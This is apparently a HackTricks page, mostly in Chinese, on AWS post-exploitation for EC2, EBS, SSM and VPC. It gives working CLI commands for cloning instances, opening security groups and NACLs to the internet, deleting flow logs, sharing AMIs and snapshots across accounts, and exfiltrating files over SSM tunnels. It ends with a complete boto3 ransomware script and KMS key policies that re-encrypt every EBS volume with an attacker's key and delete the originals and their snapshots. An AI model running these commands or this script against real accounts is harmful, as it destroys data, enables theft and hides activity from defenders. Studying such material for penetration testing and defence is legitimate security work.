# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

欲了解更多信息，请查看：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **恶意 VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **会复制 VPC 内 EC2 实例的入站和出站流量**，无需在实例本身安装任何东西。通常这些复制的流量会被发送到诸如网络入侵检测系统 (IDS) 之类的地方进行分析与监控。\
攻击者可能滥用此功能以捕获所有流量并从中获取敏感信息：

欲了解更多信息，请查看该页面：

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### 复制正在运行的实例

实例通常包含某种敏感信息。有多种方法可以进入（请查看 [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)）。然而，另一种检查其内容的方法是**创建 AMI 并从中运行一个新的实例（甚至在你自己的账户中）**：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**快照是磁盘卷的备份**，通常会包含**敏感信息**，因此检查它们通常会暴露这些信息。\
如果你发现一个**没有快照的卷**，你可以：**创建一个快照**并执行以下操作，或直接在账号内**将其挂载到一个实例**：

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

使用 `CreateStoreImageTask` 将 EC2 AMI 直接导出到 S3，以获得未通过快照共享的原始磁盘镜像。这允许在不触及实例网络的情况下进行完整的离线取证或数据窃取。

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

将一个 io1/io2 Multi-Attach 卷附加到第二台实例并以只读方式挂载，以在不使用快照的情况下抽取实时数据。当受害者卷在同一 AZ 已启用 Multi-Attach 时，这非常有用。

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

创建一个 EC2 Instance Connect Endpoint，授权入站，并注入短期 SSH 密钥，通过托管隧道访问私有实例。可以在不打开公共端口的情况下快速获得横向移动路径。

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

将受害者 ENI 的次要私有 IP 移到攻击者控制的 ENI，以冒充按 IP 列入允许列表的受信任主机。可绕过针对特定地址的内部 ACL 或 SG 规则。

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

将 Elastic IP 从受害实例重新关联到攻击者，以拦截入站流量或发起看似来自受信任公网 IP 的出站连接。

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

如果某个 Security Group 规则引用了 customer-managed prefix list，向该列表添加攻击者的 CIDR 会在不修改 SG 本身的情况下，悄然扩大所有依赖该列表的规则的访问范围。

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

创建 gateway 或 interface VPC endpoints，以从隔离子网恢复出站访问。利用 AWS-managed private links 可以绕过缺失的 IGW/NAT 控制以进行数据外传。

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

拥有 ec2:AuthorizeSecurityGroupIngress 权限的攻击者可以向 Security Group 添加入站规则（例如，允许来自 0.0.0.0/0 的 tcp:80），从而将内部服务暴露到公共互联网或其他未授权网络。
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
拥有 ec2:ReplaceNetworkAclEntry（或类似）权限的攻击者可以修改子网的 Network ACLs (NACLs)，使其变得非常宽松——例如在关键端口上允许 0.0.0.0/0——从而将整个子网范围暴露给互联网或未授权的网络分段。与按实例应用的 Security Groups 不同，NACLs 在子网级别生效，因此更改一个本来严格的 NACL 可以通过允许对更多主机的访问而产生更大的影响范围。
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

拥有 ec2:Delete* 和 iam:Remove* 权限的攻击者可以删除关键基础设施资源和配置 — 例如 key pairs、launch templates/versions、AMIs/snapshots、volumes 或 attachments、security groups 或 rules、ENIs/network endpoints、route tables、gateways，或 managed endpoints。 这可能导致立即的服务中断、数据丢失以及取证证据的丢失。

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

将 VPC Flow Logs 指向由攻击者控制的 S3 bucket，以持续在受害者账户外收集网络元数据（source/destination、ports），用于长期侦察。

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

即使你将 EC2 锁定以阻止出站流量，它仍然可以 **exfil via DNS**。

- **VPC Flow Logs 不会记录此类流量。**
- 你无法访问 AWS 的 DNS 日志。
- 通过将 "enableDnsSupport" 设置为 false 来禁用，命令：

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

攻击者可以调用其控制的账户的 API endpoints。Cloudtrail 会记录这些调用，攻击者能够在 Cloudtrail 日志中看到 exfiltrate 的数据。

### Open Security Group

通过像下面这样打开端口，你可以进一步访问网络服务：
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

可以运行一个 EC2 实例并将其注册为可用于运行 ECS 实例，然后窃取这些 ECS 实例的数据。

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### 删除 VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Required permissions:

- `ssm:StartSession`

In addition to command execution, SSM allows for traffic tunneling which can be abused to pivot from EC2 instances that do not have network access because of Security Groups or NACLs.
One of the scenarios where this is useful is pivoting from a [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) to a private EKS cluster.

> In order to start a session you need the SessionManagerPlugin installed: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Install the SessionManagerPlugin on your machine
2. Log in to the Bastion EC2 using the following command:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. 获取 Bastion EC2 的 AWS 临时凭证，使用 [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) 脚本
4. 将凭证传到你自己的机器，在 `$HOME/.aws/credentials` 文件中作为 `[bastion-ec2]` 配置文件
5. 以 Bastion EC2 的身份登录到 EKS:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. 将 `$HOME/.kube/config` 文件中的 `server` 字段更新为指向 `https://localhost`
7. 创建 SSM 隧道，方法如下：
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. 现在，`kubectl` 工具的流量通过 SSM 隧道经由 Bastion EC2 转发，你可以在自己的机器上运行以下命令来访问私有的 EKS 集群：
```shell
kubectl get pods --insecure-skip-tls-verify
```
注意，除非你设置了 `--insecure-skip-tls-verify ` 标志（或在 K8s 审计工具中使用等效选项），否则 SSL 连接会失败。由于流量通过安全的 AWS SSM 隧道传输，你免受任何形式的 MitM 攻击。

最后，这种技术并不限于攻击私有 EKS 集群。你可以设置任意域名和端口以 pivot 到任何其他 AWS 服务或自定义应用。

---

#### 快速 本地 ↔️ 远程 端口转发 (AWS-StartPortForwardingSession)

如果你只需要将 **一个 TCP 端口从 EC2 实例转发到本地主机**，可以使用 `AWS-StartPortForwardingSession` SSM 文档（不需要远程主机参数）：
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
该命令在你的工作站 (`localPortNumber`) 与实例上所选端口 (`portNumber`) 之间建立一个双向隧道，**without opening any inbound Security-Group rules**。

常见用例：

* **File exfiltration**
1. 在实例上启动一个指向你想要 exfiltrate 的目录的快速 HTTP 服务器：

```bash
python3 -m http.server 8000
```

2. 从你的工作站通过 SSM 隧道获取文件：

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **访问内部 web 应用（例如 Nessus）**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
提示：在 exfiltrating 之前压缩并加密证据，以便 CloudTrail 不记录明文内容：
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### 共享 AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### 在公共和私有 AMIs 中搜索敏感信息

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel 是一个工具，旨在**在公共或私有 Amazon Machine Images (AMIs) 中搜索敏感信息**。它自动化了从目标 AMIs 启动实例、挂载其卷并扫描潜在 secrets 或敏感数据的过程。

### 共享 EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

这是一个与 S3 post-exploitation notes 中演示的 Ransomware demonstration 类似的 proof of concept。鉴于 KMS 非常容易被用来对各种 AWS 服务进行加密，应该将 KMS 重命名为 RMS（Ransomware Management Service）。

首先，从一个 'attacker' AWS account 中，在 KMS 创建一个 customer managed key。对于本例，我们只是让 AWS 为我管理密钥数据，但在真实场景中，a malicious actor 会将密钥数据保留在 AWS 控制之外。将 key policy 更改为允许任何 AWS account Principal 使用该密钥。对于此 key policy，账户名为 'AttackSim'，允许所有访问的 policy 规则名为 'Outside Encryption'。
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
密钥策略规则需要启用以下权限，才能用于加密 EBS 卷：

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

现在有一个可公开访问的密钥可用。我们可以使用一个 'victim' 账户，该账户运行了一些附加了未加密 EBS 卷的 EC2 实例。我们针对的是这个 'victim' 账户的 EBS 卷进行加密；此攻击是假定已经入侵了一个高权限的 AWS 账户。

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

类似于 S3 ransomware 示例。该攻击将使用 snapshots 创建附加 EBS 卷的副本，使用来自 'attacker' 账户的公开可用密钥对新的 EBS 卷进行加密，然后从 EC2 实例上分离并删除原始 EBS 卷，最后删除用于创建这些新加密 EBS 卷的 snapshots。 ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

结果是账户中只剩下加密的 EBS 卷可用。

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

还值得注意的是，脚本停止了 EC2 实例以便分离并删除原始 EBS 卷。原始未加密的卷现在已经消失。

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

接下来，返回到 'attacker' 账户中的密钥策略，并从密钥策略中移除 'Outside Encryption' 策略规则。
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
等一会儿让新设置的密钥策略 (key policy) 生效。然后回到 'victim' 账户，尝试挂载其中一个新加密的 EBS 卷。你会发现可以挂载该卷。

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

但当你尝试用加密的 EBS 卷真正启动该 EC2 实例时，会失败，实例会从 'pending' 状态一直回到 'stopped' 状态，因为所附的 EBS 卷无法使用该 key 解密，原因是 key policy 不再允许。

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

这是所用的 python 脚本。它接受针对 'victim' 账户的 AWS creds 和一个用于加密的公开可用 AWS ARN。脚本会对目标 AWS 账户中 ALL EC2 实例上挂载的 ALL 可用 EBS 卷制作加密副本，然后停止每个 EC2 实例，分离原始 EBS 卷，删除它们，最后删除过程中使用的所有 snapshots。这样目标 'victim' 账户中只会剩下加密的 EBS 卷。仅在测试环境中使用此脚本 —— 它具有破坏性并会删除所有原始 EBS 卷。你可以使用所用的 KMS key 并通过 snapshots 将它们恢复到原始状态，但要提醒你的是，这归根结底是一个 ransomware PoC。
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## 参考资料

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
